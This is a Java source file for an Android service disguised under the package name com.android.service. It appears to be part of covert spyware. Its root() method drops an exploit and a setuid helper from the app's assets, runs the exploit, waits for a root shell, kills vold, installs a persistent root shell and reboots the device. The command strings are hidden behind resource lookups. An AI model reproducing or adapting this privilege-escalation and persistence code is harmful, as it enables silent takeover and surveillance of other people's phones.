package com.android.service;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import android.app.Service;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.os.IBinder;
import android.view.Display;
import android.view.WindowManager;
import android.widget.Toast;

import com.android.service.auto.Cfg;
import com.android.service.file.AutoFile;
import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class ServiceCore.
 */
public class ServiceCore extends Service {
	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
	private Core core;
	private String shellFile;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
		}
		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("ServiceCore.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
			// setBackground();
		}
		Status.setAppContext(getApplicationContext());
	}

	private void setBackground() {
		if (Cfg.DEMO) {
			final WallpaperManager wm = WallpaperManager.getInstance(this);
			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
					.getDefaultDisplay();
			final int width = display.getWidth();
			final int height = display.getHeight();
			final Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
			final Canvas canvas = new Canvas(bitmap);
			final Paint paint = new Paint();
			paint.setStyle(Paint.Style.FILL);
			paint.setAntiAlias(true);
			paint.setTextSize(20);
			canvas.drawText(Messages.getString("ServiceCore.0", 10, 100, paint);
			try {
				wm.setBitmap(bitmap);
			} catch (final IOException e) {
				if (Cfg.DEBUG) {
					Check.log(e);
				}
			}
		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("ServiceCore.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
		core.Stop();
		core = null;
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		this.shellFile = Messages.getString("ServiceCore.2"); //$NON-NLS-1$

		if (checkRoot() == true) { 
			Status.self().setRoot(true);
		} else {
			Status.self().setRoot(false);

			// Don't exploit if we have no SD card mounted
			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
				Status.self().setRoot(root());
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
				}
			}
		}

		// Core starts
		core = new Core();
		core.Start(this.getResources(), getContentResolver());

	}

	private boolean root() {
		try {
			if (!Cfg.EXP) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (root): Exploit disabled by conf"); //$NON-NLS-1$
				}

				return false;
			}

			final String crashlog = Messages.getString("ServiceCore.4"); //$NON-NLS-1$
			final String exploit = Messages.getString("ServiceCore.5"); //$NON-NLS-1$
			final String suidext = Messages.getString("ServiceCore.6"); //$NON-NLS-1$
			boolean isRoot = false;

			// Creiamo il crashlog
			final FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
			fos.close();

			// Scriviamo l'exploit sul disco
			InputStream is = getAssets().open(exploit);

			byte[] content = new byte[is.available()];
			is.read(content);
			is.close();

			final FileOutputStream fsexpl = openFileOutput(exploit, MODE_PRIVATE);
			fsexpl.write(content);
			fsexpl.close();

			// scriviamo suidext su disco
			is = getAssets().open(suidext);

			content = new byte[is.available()];
			is.read(content);
			is.close();

			final FileOutputStream fsext = openFileOutput(suidext, MODE_PRIVATE);
			fsext.write(content);
			fsext.close();

			// Eseguiamo l'exploit
			final File filesPath = getApplicationContext().getFilesDir();
			final String path = filesPath.getAbsolutePath();

			Runtime.getRuntime().exec(Messages.getString("ServiceCore.7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
			Runtime.getRuntime().exec(Messages.getString("ServiceCore.8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
			Runtime.getRuntime().exec(Messages.getString("ServiceCore.9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$

			final String exppath = path + "/" + exploit; //$NON-NLS-1$

			final ExploitRunnable r = new ExploitRunnable(exppath);
			new Thread(r).start();

			// Attendiamo al max 100 secondi il nostro file setuid root
			final long now = System.currentTimeMillis();

			while (System.currentTimeMillis() - now < 100 * 1000) {
				Utils.sleep(1000);

				if (checkRoot()) {
					isRoot = true;
					break;
				}
			}

			if (r.getProcess() != null) {
				r.getProcess().destroy();
			}

			if (isRoot) {
				// Killiamo VOLD per due volte
				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("ServiceCore.10")); //$NON-NLS-1$ //$NON-NLS-2$

				// Installiamo la shell root
				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("ServiceCore.11")); //$NON-NLS-1$ //$NON-NLS-2$

				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
				}
				if (Cfg.DEMO) {
					Toast.makeText(this, Messages.getString("ServiceCore.12"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
				}

				// Riavviamo il telefono
				Runtime.getRuntime().exec(path + "/" + suidext + " reb"); //$NON-NLS-1$ //$NON-NLS-2$
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
				}
				if (Cfg.DEMO) {
					Toast.makeText(this, Messages.getString("ServiceCore.13"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
				}

			}
		} catch (final Exception e1) {

			if (Cfg.DEBUG) {
				Check.log(e1) ;//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on root()"); //$NON-NLS-1$
			}
			return false;
		}

		return true;
	}

	private boolean checkRoot() { //$NON-NLS-1$
		boolean isRoot = false;

		try {
			// Verifichiamo di essere root
			final AutoFile file = new AutoFile(shellFile);
			if (file.exists() && file.canRead()) {
				final Process p = Runtime.getRuntime().exec(shellFile + Messages.getString("ServiceCore.14")); //$NON-NLS-1$
				p.waitFor();

				if (p.exitValue() == 1) {
					if (Cfg.DEBUG) {
						Check.log( TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
					}

					isRoot = true;
				}
			}
		} catch (final Exception e) {
			if (Cfg.DEBUG) {
				Check.log(e) ;//$NON-NLS-1$
			}
		}

		return isRoot;
	}

	// Exploit thread
	class ExploitRunnable implements Runnable {
		private Process localProcess;
		private final String exppath;

		public ExploitRunnable(String exppath) {
			this.exppath = exppath;
		}

		public Process getProcess() {
			return localProcess;
		}

		public void run() {
			try {
				localProcess = Runtime.getRuntime().exec(exppath);

				final BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
				final BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
				final BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
				final String full = null;
				String line = null;

				while ((line = stdout.readLine()) != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stdout): " + line); //$NON-NLS-1$
					}
				}

				while ((line = stderr.readLine()) != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stderr): " + line); //$NON-NLS-1$
					}
				}

				try {
					localProcess.waitFor();
				} catch (final InterruptedException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (waitFor): " + e); //$NON-NLS-1$
						Check.log(e) ;//$NON-NLS-1$
					}
				}

				final int exitValue = localProcess.exitValue();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (waitFor): exitValue " + exitValue); //$NON-NLS-1$
				}

				stdin.close();
				stdout.close();
				stderr.close();

			} catch (final IOException e) {
				localProcess = null;
				if (Cfg.DEBUG) {
					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e); //$NON-NLS-1$
					Check.log(e) ;//$NON-NLS-1$
				}
			}
		}

	};
}
